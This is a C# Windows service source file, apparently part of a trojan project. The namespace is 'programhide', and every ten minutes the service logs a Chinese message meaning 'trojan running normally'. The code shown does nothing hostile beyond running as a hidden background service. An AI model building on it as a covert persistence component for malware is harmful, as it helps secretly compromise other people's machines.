using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace programhide
{
    public partial class ldService : ServiceBase
    {
        System.Threading.Timer recordTimer;
        public ldService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            IntialSaveRecord();
        }

        protected override void OnStop()
        {
            if (recordTimer != null)
            {
                recordTimer.Dispose();
            }
        }
        private void IntialSaveRecord()
        {
            TimerCallback timerCallback = new TimerCallback(CallbackTask);


            AutoResetEvent autoEvent = new AutoResetEvent(false);


            recordTimer = new System.Threading.Timer(timerCallback, autoEvent, 10000, 60000 * 10);
        }


        private void CallbackTask(Object stateInfo)
        {
            FileOpetation.SaveRecord(string.Format(@"当前记录时间：{0},程序状况：木马运行正常！", DateTime.Now));
        }
    }
}
